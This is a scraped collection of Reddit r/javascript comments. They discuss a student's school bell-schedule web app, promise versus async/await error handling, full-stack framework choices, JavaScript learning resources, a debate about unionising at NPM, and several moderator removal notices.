This is sweet! Good work! Tiny tiny comment, ‚Äúit's features‚Äù should be ‚Äúits features‚Äù :P
I‚Äôll go update that now. Thank you so much for your kind words!
I think these are good points. The simple catch example would work well if you just wanted to assign a default value or something. Less well if the behavior is more complex. I don't know if I have a strong instinct for what is the best approach. Let me think outloud and run through some options. Vanilla Promises: someDatabaseQuery() .then(data =&gt; res.send(data)) .catch(err =&gt; { console.error(err); res.status(500).send('DB Error'); }); Traditional await with try/catch: try { const data = await someDatabaseQuery(); res.send(data); } catch(err) { console.error(err); res.status(500).send('DB Error'); } "Go-style" await: const [err, data] = await Executable(someDatabaseQuery()); if (err) { console.error(err); res.status(500).send('DB Error'); } else { res.send(data); } "Go-style" await with a catch: const data = await someDatabaseQuery().catch(err =&gt; { console.error(err); res.status(500).send('DB Error'); }); if (data) { res.send(data); } Honestly, my personal favorite: Vanilla Promises. Probably my second favorite is the traditional try/catch, though I might change my mind if we got really strict with what we wrap in the try block: let data; try { data = await someDatabaseQuery(); } catch(err) { console.error(err); res.status(500).send('DB Error'); } if (data) { res.send(data); } I guess vanilla Promises suffers a bit if we got strict too, but I'd still prefer it: someDatabaseQuery() .catch(err =&gt; { console.error(err); res.status(500).send('DB Error'); }); .then(data =&gt; { if (data) { res.send(data) } }); ¬Ø\\\_(„ÉÑ)_/¬Ø
As a programmer: ‚ÄúOne of us‚Äù
If I can't build it myself, I don't think it is particularly lightweight. The sugar async/await uses requires the JS interpreter to do some magic in the background. No library can implement their own version of async/await. If I want to explain Promises to someone, I can just build my own Promise class and point at it. If I want to explain async/await, I have to do what you did and say come up with some examples and say "these things are kind of equivalent". It's not even hard to come up with examples that are _very_ challenging to do equivalents of with Promises. Do the equivalent of this with Promises: async () =&gt; { const res1 = await dataAsPromised1(); const res2 = await dataAsPromised2(); const res3 = await dataAsPromised3(); return res1 + res2 + res3; };
Right. Well the big advantage of Rust is that it is rock-solid. If there is a function that can throw an error, you absolutely _must_ handle that error. You have no other option. JS let's you do whatever the hell you want. It's often much easier to read/write as a result.
Yah. That‚Äôs prolly a big reason why it sucked. You threaten someone‚Äôs job and say u have a week to finish this shit, you‚Äôre not going to get optimum coding from that. I would‚Äôve quit right then, myself. Sounds like some bullshit.
The answer is learn both! But React/GraphQL already got some node stuff in it as well :)
If the animation class is something like .flying-arrow, add a listener to the document (as WebNecromancer said) and, in the handler, select your arrow element (document.querySelector) and apply the animation class to it.
That was the conclusion I was coming to, but needed some feedback. Thanks! I have experience with React, so it‚Äôll be nice to learn Node and GraphQL in the context of full stack.
I chuckled at ‚Äúdesigned to scale‚Äù
Thanks!
So wouldn‚Äôt that make this (at least partly) his intellectual property?
I guess technically yeah, but I also worked pretty closely with him in the earlier days of development. He would send me issues to fix and stuff to add so I feel like he isn‚Äôt going to sue me over this
Yeah, the landing page is a little optimistic. Currently its only hardcoded for my school but I‚Äôm likely going to add a database to it this summer
Sure. I only mentioned it because it would be the right thing to do to at least run it by him if you are trying to monetize or grow this in anyway, considering, based off your statement from above, that the whole project was born out of him asking you guys how long this service would take to develop.
Yeah, that‚Äôs definitely something I need to do. One of the others in that group has made a couple code contributions too so I definitely need to check with everyone before assigning a license to this and adding paid bonus features
For sure, man. Keep up the good work!
Thanks! It couldn‚Äôt have gotten to the front page without you and everyone else upvoting and sharing it tho.
This is awesome! Makes me wonder how complicated the schools scheduling system is though... I've not been in school for a while but didn't remember my school's scheduling being that complex!
He's simulating the accuracy of normal school clocks.
For the most part our schools bell schedule is just hard to remember. There‚Äôs classes that end at like 12:01 and weird things like that. I don‚Äôt think there was anything inherently wrong with the way it was being done, I just felt like the system of taping schedules to the wall, writing it on boards and people texting screenshots around could be made more efficient. I also hope that this will allow everyone (parents especially) to have quicker easier access to schedules and notifications of last-minute schedule changes such as snow days.
Hmm. Well one time in a Java Spring app i had a jQuery ajax call that dynamically filled drop down menu‚Äôs with info based on which line in the table you chose to edit. PM says he wants to be able to choose an item to link from another table by its name and its item number. Unfortunately the selectize tool we were using only supported mapping one string per value, so we couldn‚Äôt have two different options return the same value. No problem lol I just made one of them send a negative and one send a positive version of the same number and in the Java code i took the absolute value of the incoming number and used it to get the array of values i needed.
I meant that ‚Äúscale‚Äù doesn‚Äôt literally mean scaling to a screen size. Scaling usually refers to the complexity of a system and it‚Äôs ability to scale to meet the demands of its user base. ‚ÄúScaling up‚Äù means getting better hardware. ‚ÄúScaling out‚Äù is getting more hardware to meet demands. Please correct me if I‚Äôm wrong.
Now THAT'S what I'm talking about! That is how your website's UX should be. It's unfortunately lost on so many people. Great work!
It‚Äôs not his ip. Don‚Äôt listen to that guy. Discussing something with someone quickly in a ‚Äúcan you do that?‚Äù Context hardly constitutes anything other than a tire-kicking conversation of ‚Äúdam thatd be cool‚Äù
I see how that phrasing could be confusing. I just updated it to something that should be less ambiguous
Unfortunately I can‚Äôt accept your praise on this front. I did not design the landing page myself. I just happened to stumble upon the free templates created by the folks at styleshout.com and modified it to fit my needs.
Yeah, even though it may not be strictly necessary, id like to avoid a situation where a misinterpretation causes less than pleasant feelings between me and anyone I‚Äôve worked with on this
Brave browser. Windows 10. 1920 x 1080 maximized. availWidth: 1920 availHeight: 1040
I agree these help. But, when I work with CSS, I get the same feeling as when I work with extremely outdated code. The whole thing needs to be refactored. Hundreds of thousands (or millions?) of devs waste an ungodly amount of time unraveling this rats nest every day. I think executing the perpetrators publicly would send a strong message. Although, I may be overreacting.
thanks! This post could not have been this successful without all this support though.
LGTM üéØ
If people don‚Äôt put the work in, you don‚Äôt get to reap the benefits unless that‚Äôs the deal you carved out. Sorry kid that‚Äôs the way of the software world.
That's awesome! Good job and congratulations on being an innovator! I think you found what your good at and what you enjoy in life...that's half the battle! Good luck to you and all your future inventions!
what do you mean by this?
Guide: [https://ptsjs.org/guide/sound-0800](https://ptsjs.org/guide/sound-0800) Demo: [https://ptsjs.org/demo/?name=sound.freqDomain](https://ptsjs.org/demo/?name=sound.freqDomain)
Thank you guys for all your support! I never expected to get to the front page.
Ir you could just modify the time in the phone settings
In hindsight that would have made more sense haha
Hi /u/scheduled_nightmare, this post was removed. To show off a project (i.e. a finished or semi-finished page, demo, working example, etc.), please include one (1) of the following: * A link to a project page with unbuilt/unminified source code -- sites like GitHub are perfect for this. * A write-up about the development of the project. This can take the form of a blog post, a `README.md` within the project, or a comment on the post itself. The details are up-to-you; you can write from a high-level about your architectural decisions, or you can write on a lower-level about the pros &amp; cons of specific libraries and frameworks you used. The main point is that you're discussing your code -- or your approach in creating the code -- in some way. * A working codepen/jsfiddle/etc. of the code. One of the easiest and most common ways to satisfy this requirement is to simply include a ["Fork me on GitHub"](https://github.com/blog/273-github-ribbons) ribbon your site. Another way to satisfy this requirement is to comment on the post itself, with either a link to a write-up, or with the write-up as the comment. Lastly, instead of all the above, if you just want to showoff your project, feel free to post it to our weekly _"Showoff Saturday"_ post. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/darn_it_all_to_heck, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/LazyBriton, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/user8051, this post was removed. Prohibited low-effort content includes: * Questions that are easily Google'd. * Memes, jokes, etc. Please post to /r/ProgrammerHumor instead. * Most images and gifs. * [Listicles](https://en.wikipedia.org/wiki/Listicle), "Curated lists", and similar content. * Polls, surveys, etc. unless from an accredited academic body or trusted source (StateofJS, etc.). Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
1) lots of people like claiming intellectual property rights over others in the tech industry. Large companies sue small companies all the time for infringement. Patent trolls go on a patenting spree and patent as many things as they can and sue small companies that maybe infringing on ‚Äútheir ip‚Äù Silicon Valley(the show) did a really good rendition of this. 2) if you don‚Äôt put the work in as an engineer or a business person with an app, you don‚Äôt get to reap the benefits. Unless you carved out this deal. Meaning every successful startup or app has carried its fair share of useless people along the way. Patent whiners, early stage ‚Äúfounders‚Äù (your case) and shitty engineers. Some people made the deal and the company can‚Äôt just screw them out of their contract so they just eat the cost of what it takes to pay them out. The point is, don‚Äôt cut people into an app deal if they‚Äôre not written in or provide some sort of value to your idea.
I believe this may have been a mistake. This thread was posted as part of Showoff Saturday containing the link to the landing page ([https://classclock.app](https://classclock.app)) for an open source project ([https://github.com/MoralCode/ClassClock](https://github.com/MoralCode/ClassClock)) that was written in JavaScript. What else do I need to do to get this post reinstated?
Hi /u/immortalcoder, this post was removed. Since we are a programming subreddit, there are very few instances where visual media is valid content for /r/javascript, including screenshots, demos, etc. Memes and other low-effort content are already prohibited. Please use the `submit a new link` option with a valid source URL, whether it's the project homepage, a blog post, etc. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Super cool. I was doing some research on accomplishing something like this a few days ago! Does this happen live with audio played within the window or is it pre-rendered? Probably chose the wrong word but I think I make sense!
Super cool. I was doing some research on accomplishing something like this a few days ago! Does this happen live with audio played within the window or is it pre-rendered? Probably chose the wrong word but I think I make sense!
Yup, definitely a mistake, sorry. I recently installed NoScript and it caused the Gitthub logo to not appear on your site, but I see it now. Restored.
Innerhtml
No. Inventions and innovations can be patented. Recorded expressions can be copyrighted. Ideas can't be patented or copyrighted.
Thank you so much!
This is the best advice in this thread. You have a good idea, but not a business. You will learn the most by open sourcing and collaboration. Especially at your age, when self confidence outpaces real knowledge and experience.
Fair enough. I certainly don‚Äôt know IP law. I was speaking more from an ethical perspective. Not only did the teacher pitch the idea, but the poster seemed to indicate that he was involved in the project from the beginning, not necessarily contributed code but more a project manager type role. I was just thinking it would be the right thing to do ü§∑üèº‚Äç‚ôÇÔ∏è
Thanks! Yes, it's live in real-time, and works with audio files as well as audio inputs (eg, microphone). You can also do audio synth (eg, with Tone.js) and connect to Pts for visualization. See the guide here: [https://ptsjs.org/guide/sound-0800](https://ptsjs.org/guide/sound-0800) Other inputs like MIDI keyboard should also work (but I haven't tried it yet.)
Microsoft CRM \*shiver\*
How stupid are your teachers that they need an app to help them read a damn clock? I feel like this is a workaround to the actual solution of not hiring idiots as teachers.
document.bodg.innerHTML
ClassClock was created as a tool to make everyone‚Äôs life in school a little easier and more convenient by putting the bell schedule in one place that‚Äôs easier to access and see at a glance. The alternative process of looking at a schedule, finding your class, looking when it ends, and comparing it to the current time works perfectly well, However, as a developer, I wanted to help make this system easier, faster, and more convenient to use. The problem this app is solving is not the teachers inability to tell time, but the inefficiencies in the current way of handling schedules at my school.
Funny how we managed the bells just fine for like 80 years before apps existed. I even went to a hybrid Jr High/High school that had 2 different student groups responding to *multiple different bell tones* and we managed just fine. And half the 'classrooms' were trailers in the parking lot. All I'm saying is if my kid came in and said 'My teacher needs a phone app to know when my class is supposed to end' I'd be fucking down at the principals office tomorrow morning at 8AM, and if that didn't work I'd be at the superintendent of the school districts office shortly thereafter.
I think he refers to the app itself
They says "website"
I love the work, great job!
well maybe your hysterical view of the world isn't how the real world actually works. Just because your 'highly intelligent school' managed fine with 'your old ways'. we understand that you are 'very bad ass' and honestly no one cares if the old ways worked in your 'hybrid school' because clearly in his school it didn't work as well. &amp;#x200B; Don't discourage a rather useful app that allows simpler management of their time, made by the student himself, mr badass,
Lol
This is such a great encouragement for me, I've only been doing programming for like 2 months
First, please correct all these spelling errors you have in your repo. Second, how should someone contribute if there is nothing set up other than an empty HTML template? I don‚Äôt get it, I would help but first try to code something and then post here. Greets
Cool, I will defiantly check it out later.
So what you intend to do is to print out the characters with which you create the emoji? You plan to make this a slack bot, or something people can install as a npm module and use in their projects? Would be happy to help, but it would really help me if I knew what your goal for this project is and maybe you could create some issues that relate to that goal, so that other devs can easily jump in, treat themselves to an issue and fire away a pull request.
Please pass it to the left, bru
Come back if you find anything. Maybe with typescript it would be easier to build analysis tools.
Of course they are free to act as they see fit, provided their actions don't break any laws, but that does not mean we cannot pass judgement on them and act accordingly, which is pretty much what has happened in the sense that the wider community is chiming in with their views, but also in the sense that a large part of their work force decided that life is too short to work for an organization that treats its employees like that.
Background on what hashCode is for: [https://www.javaworld.com/article/2077346/hashtables.html](https://www.javaworld.com/article/2077346/hashtables.html) A long time ago, Sun used to recommend to Java developers that prime hashCodes would perform better than non-prime. Someone obviously read that and didn't really understand that by returning the same number every time they just did the exact opposite of what they wanted and destroyed hashing performance by making every single object collide.
3 lines of code. Nice.
That popup to your own youtube channel is really stupid.
Yes I a thankful anyone want to help. This project aims to be a website where user types the emoji and clicks button. Then it will be translated using node-emoji module and printed to text box. And that's all I am having problem with printing the text to textbox. If you want some more info dont worry to open an issue so everyone can see it.
Yes it's pretty small now but I hope it will grow.
&gt;we walked to school uphill both ways, always in snowstorm, and we LIKED it that way!
[https://xkcd.com/827/](https://xkcd.com/827/)
If you read contributing file I need help with js. If you don't fully understand what bugs am trying to solve write me here back or write a issue so everyone can see it. I thankful for any help and be very happy if anyone will help. Thanks!
Everyone here I created a issue in the repo where the issue is more specified. I am open to any questions there or here in the forum üëá
[https://hasbottashadhisporridge.com/](https://hasbottashadhisporridge.com/) Actual application might be slightly off-topic, but built a quick web application for a running joke that F1 fans have this season. Simple React application using Hooks to pull API data and display the UI - basic enough stuff. &amp;#x200B; Cool thing is I fully developed and deployed it using [StackBlitz](https://stackblitz.com/) - an online editor with a lot of functionality built in (e.g. GitHub integration, multiple front-end framework support out of the box etc.) I was really impressed by how powerful StackBlitz proved to be and being able to do it from within the browser was awesome - no local dependencies to manage and get set up. Would encourage anyone to jump over and give it a go! Super cool üëç Repo [here](https://github.com/pmc-a/has-bottas-had-his-porridge) for anyone interested too.
The company I work for has outsourced a bunch of dev on one project. Constant problems with them, blatantly ignoring standards and best practices. 1000 line mega components that does barely anything, huge amounts of duplicated code. It's at the point where we need to basically scrap a bunch of it and start again. Management always think outsourcing cuts costs, when it actually just increases them because the quality is usually garbage.
I also don't see anything wrong from ethical or moral stand point too. And frankly, I don't see what's to be angry about here. Company doesn't engage in collective bargaining and reasons may be numerous. Collective bargaining also might impede and make other employees feel very uncomfortable or mistreated. Especially ones at the ends of the bell curve in terms of performance / productivity. There is nothing bad or good about it. It's just how people opt in to negotiate the terms of their contracts. If one party feels like it's not working for them, they can terminate at any time. I kinda get it if union was the little guy who has not leverage. But good software developers working in 1st world country, who also have big company names in their CV are certainly not victims of anything. And I personally find playing victim morally repugnant.
There is no money in this type of app. The reason you got upvotes is because your story is compelling. You should keep going, but go into more profitable apps
Ban this user, it's either a troll bot or a bored kid
Very intriguing, nice work
Nice work mate,working on a specifc problem and finally finding a solution and making a app outta it is pretty appreciable, btw which language did you code it on? : a curious student geek :)
Employees can have their own policies to protest as they see fit, provided their actions don't break any laws. It goes both ways, suck it up and deal with it.
Get your teachers to stick up a QR code by their blackboards so students have to look at it all day in every classroom, all class.
It's a few years old (and doesn't support \`https\`) but the content holds up and it doesn't seem to have been posted before. Hope someone finds it useful :-)
Apologies if some of the details are a bit off, it's been a while since I had to work with the older Internet Explorers and I've hidden away all those memories in a deep dark corner of my mind. A few years ago I wrote a library that had to support nearly every browser released since IE6. Debugging and testing on IE6 was the worst due to the utter lack of developer tools and all the quirky behavior. IE8 was also quirky and terrible, and even though it had developer tools they were utterly useless. Mind you, this was recent enough for all the Internet Explorer quirks to have been documented already across various places online, so it was just a matter of reading through various sources and then going through a bit of trial and error in order to gradually get things working. The resulting script size was bloated and every newer browser was forced to pay a performance penalty due to the polyfills required to support old versions of Internet Explorer. Overall, I made a few poor design decisions due to my limited experience at the time, and some of those decisions ended up having a visible impact. Just thinking about it makes me frustrated with my past self.
Hi /u/tersecol, welcome to reddit! Unfortunately, this post was removed because you are a new user. This is a spam-prevention measure, we hope you'll understand. You'll be able to post in a few days, however, you can start commenting now! We'd love to get to know you. In the meantime, please read the site [reddiquette](http://www.reddit.com/wiki/reddiquette) and [/r/javascript's guidelines](http://www.reddit.com/r/javascript/wiki/index). Also, **/r/javascript is not a support channel.** For help with javascript, please post to /r/LearnJavascript instead. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
It's a nice touch this and an improvement on the 0.x technique.
[You don't know JS](https://github.com/getify/You-Dont-Know-JS) is kind of state of the art.
Hey, I created an issue, have a look into it.
I wasn't even aware that you were involved in NPM in any kind of way, and I apologise if I came off as being angry and made you feel bad, that was not my intention, at all. &amp;#x200B; I stand by the point that I made, though, which is that employees in addition to the wider public are fully within their right to opine on and object to the way NPM as an organisation conducts itself. The cool thing is that if NPM were to listen and take this criticism to heart, it might even emerge from this whole mess as a stronger organisation with a happier team, and happy teams usually accomplish great things. &amp;#x200B; I'm not a big fan of unions either, but for different reasons; they tend to create labour market inefficiencies and create an elevated caste of workers at the expense of those that don't have membership. Unions are not immune to corruption and nonsense either, and in the country where I live you have people who basically make a career out of working in a union and they are caught over and over again engaging in nepotism, bribes and what have you. So I'm not going to declare corporations as the source of all things evil and unions as inherently divine and good. &amp;#x200B; Having said that, usually when things get to the point where people want to unionise, it is because they have been subjected to poor treatment on the part of management or the company at large, so the mere fact that it got to this point at NPM is, to me, indicative that the organisation has a problem: a problem that it could probably solved by participating in the debate that has arisen in good faith and listening to what all concerned stakeholders have to say on the matter.
My book teaches ES2019 to programmers and is free to read online: http://exploringjs.com/impatient-js/toc.html
Happy cake day and thank you!!
Thanks! A replied now. Its funny that we are both from cz.
Pro: amazing work. Con: the jittering is a little nauseating.
It‚Äôs all still relative. MERN is still the most popular. I would recommend NUXT.js. It‚Äôs not a true full stack in that sense but can easily be used to make one by dropping in express.js, etc. but can also run itself on a standard ngnix server or github, netlfy, etc. if you prefer react, take a look at NEXT.js
what problem are you solving? that should inform your choices. if you're only going to use javascript, good luck. it's a constant flavor of the month churnfest. which is pretty apparent since the things you learned a couple of years ago are irrelevant. pick a reasonable server side langauge like python, ruby, php, golang, clojure, java and find a framework that works for you. those communities tend to have much more stable software cause it's not a bunch of novices and hobbyists reinventing the wheel every two years whenever they discover some neat concept from the 60s.
Been reading *Secrets of the JavaScript Ninja* (2nd edition), and it's pretty good.
If you're using React: * [Victory](https://github.com/FormidableLabs/victory) * [Elastic Charts](https://github.com/elastic/elastic-charts) If you think D3 is bloated, [C3](https://c3js.org/) might be an interesting alternative. There is also [Plotly](https://plot.ly/javascript/) which is very powerful and which is not limited to JS (also has Python, R, Matlab, ... APIs)
It all depends on individual use cases I've found. For my personal stuff, I prefer to isolate the front-end and back-ends completely - and like you said, have a CRA application interaction with a Lambda to fetch or process the data it needs. &amp;#x200B; A popular concept that is emerging at the moment is the [JAM stack](https://jamstack.org/) \- it focuses around this decoupling idea, it could be worth checking out. Although saying that, it really all depends on use case!
Is it standalone or are you integrating with something like Ed-fi?
This would have been so useful back when I was in high school. I spent a lot of time counting the seconds till my least favorite classes ended and I spent so much time looking for something exactly like this
Not sure what's to suck it up. I'm the person who's arguing that things going both ways are fair. And solely depends on parties involved decision to associate themselves with certain parties or terminate. Or other employees who do not want to be part of the union can leave the company. However, that's generally deadly for the company in question, because people leaving will most likely be the high performing ones. Given observable [principle](https://en.wikipedia.org/wiki/Pareto_distribution) of Pareto distribution, which roughly translates, that 10% of employees contribute to around half of entire production, I think that terminating the huge chunk of employees over the high performing ones, who will generally want to be compensated above the median, is perfectly reasonable position to take for a business. Unions generally fail at professions where are high disparities in production. Physical work doesn't scale as much, so unions kinda make sense, but any kind of creative work usually ends up in big trouble. I'm saying this, because people as well meaning as they are often, due to misplaced empathy or compassion do not see the overall picture and thus engage in very counter productive approach.
OK then, perhaps we're more in agreement than my initial reaction led me to believe.
you can easily disregard the "community" though. in case of mean stack in particular, each individual component is still very much alive, and the decreased number of Medium shitposts and todo apps doesn't indicate it's demise. whatever the fuck they're raging on about right now will suffer the same fate few years from now.
MERN is where a lot of people are these days because it's no-nonsense, but there's a few other options to consider (these names aren't official, but they're based on the tech in that stack); - PRFN: Postgres, React / React Native, FeathersJS, Node - GARxN - GraphQL, Apollo, React / React Native, (x = DB of preference), Node You can also replace GraphQL with socket.io or another websockets library if you prefer to use good old REST but in realtime. You can also add docker to any of these, though since it's a container system, it's technology-agnostic and not specific to a stack. Your use case depends on what you want to achieve. Also be aware that you don't necessarily need to use the 'official' stack. For example, even though I develop projects that run MERN, I create my frontend and backend independently, but they use those technologies. A stack hasn't been abandoned, it just means you writes each part using the individual tech. Essentially, many projects these days are doing what MEAN and MERN did originally: Create a front-end that talks to a back-end. Express hasn't changed because it hasn't needed to. People often forget that it's really just a routing engine (in the same way React is just a rendering / template engine at the core). It's not the server itself any more like it was in v3, which means you can run any HTTP interface you like - whether it's HTTP2, HTTPS, etc. I also don't use AWS because it's added complexity compared to digitalocean (the AWS docs are a nightmare to try and understand). That's personal preference more than anything, but spinning up an instance or image of anything I want on DO is 2-3 clicks in a web UI that's coherent to follow. As you also mentioned, the pricing is better too.
* slaps top of repo * This bad boy can fit so much cleaning potential in it.
I don't work in NPM. Sorry if my wording misled you. Perhaps I jumped to different context too quickly. I simply have left a company before, due to the reasons I've named. This shouldn't be taken as me summing up all unions across the board, however I haven't yet encountered any reasonable workers union to this day. This may also have more to do with my country's culture though, post-soviet block country. So a lot of social habits are still terrible even though improving at very rapid pace. Perhaps there is something which has to be addressed within NPM. I'm just trying to push forth the idea that things are generally more complicated than they may first appear. And it's not really one sided issue as it seems to have been proposed a such. As if some moral wrong has been done.
&gt;In fact, Express itself seems like it's hardly evolved in a 4 years since I've touched it. That's not a downside. &gt;Has everything migrated over to AWS' ecosystem? No. &gt;Or is the idea of full-stack all working on one server (ala MEAN/MERN) dead? No. &gt;Is it more prudent to decouple the frontend and backend completely and have something like React via create-react-app, talking to a Serverless/Lambda Node API? Depends entirely on what you're building. Stick with what you know. If you really do know the meme stack, then stick with it. If not, then look into your options and select the one that looks most appealing to you.
I made my own smart watch theme that connects to my calendar and tells me the time left of current events (or until the next one). Then it was just a matter of putting the school calendar in my calendar. Hard coding would probably make it easier for changes. I haven't known the school calendar in 3 years but I can tell you exactly how many minutes left of class. :-)
Mind sharing more details? Generating those configs is pretty damn messy and I'll definitely refactor it but anything else you'd point out?
Personally, I've moved to VueJS / Vuex on the front-end (I write my own UI components, but I've used Vuetify and Bulma and have considered Tailwind), and dotnetcore and SQL Server (Azure) on the back end (with heavy use of Dapper). This stack sparks joy for me. YMMV.
Hi /u/ExcellentMood3, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/jaysmith123, this post was removed. Prohibited low-effort content includes: * Questions that are easily Google'd. * Memes, jokes, etc. Please post to /r/ProgrammerHumor instead. * Most images and gifs. * [Listicles](https://en.wikipedia.org/wiki/Listicle), "Curated lists", and similar content. * Polls, surveys, etc. unless from an accredited academic body or trusted source (StateofJS, etc.). Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/jascination, this post was removed. Prohibited low-effort content includes: * Questions that are easily Google'd. * Memes, jokes, etc. Please post to /r/ProgrammerHumor instead. * Most images and gifs. * [Listicles](https://en.wikipedia.org/wiki/Listicle), "Curated lists", and similar content. * Polls, surveys, etc. unless from an accredited academic body or trusted source (StateofJS, etc.). Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/KrishnaAnaril, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/atum47, this post was removed. To show off a project (i.e. a finished or semi-finished page, demo, working example, etc.), please include one (1) of the following: * A link to a project page with unbuilt/unminified source code -- sites like GitHub are perfect for this. * A write-up about the development of the project. This can take the form of a blog post, a `README.md` within the project, or a comment on the post itself. The details are up-to-you; you can write from a high-level about your architectural decisions, or you can write on a lower-level about the pros &amp; cons of specific libraries and frameworks you used. The main point is that you're discussing your code -- or your approach in creating the code -- in some way. * A working codepen/jsfiddle/etc. of the code. One of the easiest and most common ways to satisfy this requirement is to simply include a ["Fork me on GitHub"](https://github.com/blog/273-github-ribbons) ribbon your site. Another way to satisfy this requirement is to comment on the post itself, with either a link to a write-up, or with the write-up as the comment. Lastly, instead of all the above, if you just want to showoff your project, feel free to post it to our weekly _"Showoff Saturday"_ post. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/russianspy911, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/AlertThinker, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/StrongYogurt, this post was removed. Prohibited low-effort content includes: * Questions that are easily Google'd. * Memes, jokes, etc. Please post to /r/ProgrammerHumor instead. * Most images and gifs. * [Listicles](https://en.wikipedia.org/wiki/Listicle), "Curated lists", and similar content. * Polls, surveys, etc. unless from an accredited academic body or trusted source (StateofJS, etc.). Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/kimchiqween, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
This looks great! As a teacher and student I would totally use this.
There's no standard API for retrieving statistics of data stored by sites. So, you'll just have to calculate them manually. If a browser provide a better (vendor specific) API for it, then use that too.
You don't know js goes with out saying Also video tuts help a lot Personally started with Jeffery way , awesome tutor Professional javascript from wrox is awesome too Javascript the good parts from O'Reilly
Okay, i understand. It's shame. I wish you best of luck on that project! There is no better feeling than the one you get when you fix the mess from before! Cheers to you pal!
Hey I would delete this immediately
Thanks üòä
Hi. Actual high school teacher here. I teach digital media and video, so I'm a popular and sought-after elective. My school doesn't have a functional clock or bell in my classroom. My class building is separated from the majority of the campus, and other class bells cannot be heard from inside my classroom. I have a cheap IKEA analog clock on my wall. I print out the byzantine school bell schedule, which takes four sheets of paper to print it large enough to be seen from a distance. I post that schedule on the wall of my classroom a couple of feet from the wall clock. And yet I still get students in my classes, 8 months into the school year where they come to my class three times a week, asking me what time class is over. I think this app is perfect, since the students are so curious and/or fixated on how much time is left in class. You are of course entitled to your opinion, but you should consider walking a mile in the shoes of those you would disparage before expressing yourself. Have a great day, and go Tigers
it‚Äôs not a framework, it‚Äôs a compiler!
That‚Äôs awesome! Keep up the great work!
My primary goal at this stage isn‚Äôt to make money. Right now I‚Äôm just trying to see if there‚Äôs enough interest in this project to make it worth investing more time into with the hope that I can help people from other schools as well.
ClassClock was originally written with vanilla JavaScript on a basic HTML/CSS website, but now there‚Äôs a plan to migrate over to using React and typescript in order make things easier to develop and allow us to potentially create an iOS/Android app fairly easily in the future if it makes sense to do that.
Believe me, there‚Äôs posters covering basically every inch of my school haha.
Currently this is a standalone system but I‚Äôm definitely curious about the possibility of integrating with the systems that schools are already using. If you have more information, feel free to join the slack workspace so we can chat about the details of this.
